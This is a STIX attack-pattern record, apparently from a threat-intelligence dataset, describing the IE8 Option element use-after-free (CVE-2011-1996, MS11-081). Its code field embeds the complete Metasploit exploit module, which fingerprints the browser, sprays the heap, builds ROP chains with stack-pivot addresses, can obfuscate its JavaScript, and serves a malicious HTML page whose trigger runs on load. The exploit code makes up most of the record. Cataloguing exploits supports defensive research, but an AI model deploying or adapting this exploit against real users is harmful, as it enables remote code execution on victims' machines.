{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46bd8294-ce3b-4041-97ab-7c90e81c51d1",
    "created": "2024-08-14T16:43:24.195591Z",
    "modified": "2024-08-14T16:43:24.195595Z",
    "name": "\"MS11-081 Microsoft Internet Explorer Option Element Use-After-Free\"",
    "description": " This module exploits a vulnerability in Microsoft Internet Explorer.  A memory corruption may occur when the Option cache isn't updated properly, which allows other JavaScript methods to access a deleted Option element, and results in code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms11_081_option.rb",
            "external_id": "ms11_081_option.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1996"
        },
        {
            "source_name": "reference",
            "url": "http://ifsec.blogspot.com/2011/10/internet-explorer-option-element-remote.html"
        },
        {
            "source_name": "reference",
            "url": "http://pastebin.com/YLH725Aj"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS11-081 Microsoft Internet Explorer Option Element Use-After-Free\",\n      'Description'    => %q{\n          This module exploits a vulnerability in Microsoft Internet Explorer.  A memory\n        corruption may occur when the Option cache isn't updated properly, which allows\n        other JavaScript methods to access a deleted Option element, and results in code\n        execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Ivan Fratric',  #Initial discovery\n          'juan vazquez',  #Metasploit\n          'sinn3r'         #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-1996' ],\n          [ 'OSVDB', '76208' ],\n          [ 'MSB', 'MS11-081' ],\n          [ 'URL', 'http://ifsec.blogspot.com/2011/10/internet-explorer-option-element-remote.html' ],\n          [ 'URL', 'http://pastebin.com/YLH725Aj' ]\n        ],\n      'Payload'        =>\n        {\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => 0x4f8, 'OffsetVirtualFunc' => 502 } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => 0x4f8, 'OffsetVirtualFunc' => 502 } ],\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => 0x4f8, 'OffsetVirtualFunc' => 502 } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-10-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = %Q|\n    function heap_spray() {\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n    }\n    |\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n      @heap_spray_func = js.sym(\"heap_spray\")\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      rop_payload = generate_rop_payload('msvcrt', \"\", {'target'=>'xp'})\n      rop_payload << make_nops(t['OffsetVirtualFunc']-rop_payload.length)\n      rop_payload << \"\\xeb\\x04\" # jmp $+6\n      rop_payload << [0x77c15ed5].pack(\"V\") # 0x0c0c0c0 # stackpivot => xchg eax, esp # ret\n      rop_payload << code\n    else\n      print_status(\"Using JRE ROP\")\n      rop_payload = generate_rop_payload('java', '')\n      rop_payload << make_nops(t['OffsetVirtualFunc']-rop_payload.length)\n      rop_payload << \"\\xeb\\x08\" # jmp $+10\n      rop_payload << [0x7c348b05].pack(\"V\") # stackpivot => xchg eax, esp # ret\n      rop_payload << [0x7c348b05].pack(\"V\") # stackpivot => xchg eax, esp # ret\n      rop_payload << code\n    end\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    @heap_spray_func = \"heap_spray\"\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n\n\n    #var fakeobj = unescape(\"%u0c0c%u0c0c\");\n    #call to 0c0c0c0c\n    #eax ==> 0c0c0a14\n    html = %Q|\n    <!DOCTYPE html>\n    <html>\n    <head>\n    <script>\n    #{js}\n\n    function ivan()\n    {\n\n      var fakeobj = unescape(\"%u0a14%u0c0c\");\n      fakeobj += unescape(\"%u4141%u4141\");\n      while (fakeobj.length <= 0x38/2) fakeobj += unescape(\"%u4141%u4141\");\n\n      var formobj, selobj, optobj;\n      selobj = document.getElementById(\"select1\");\n      formobj = selobj.form;\n\n      var imgarray = new Array();\n      for(var j = 0; j < 500; j++) {\n        imgarray.push(document.createElement(\"img\"));\n      }\n\n      for(var i=0;i<5;i++) {\n        optobj = document.createElement('option');\n        optobj.text = \"test\";\n        selobj.add(optobj);\n      }\n\n      selobj.innerText = \"foo\";\n\n      for(var i = 0; i < imgarray.length; i++) {\n        imgarray[i].title = fakeobj.substring(0, 0x38 / 2 - 1);\n      }\n\n      #{@heap_spray_func}();\n\n      formobj.reset();\n    }\n\n    </script>\n    </head>\n\n    <body onload='ivan()'>\n    <form method=\"post\">\n    <select id=\"select1\">\n    </select>\n    </form>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-11",
    "x_mitre_platforms": [
        "win'"
    ]
}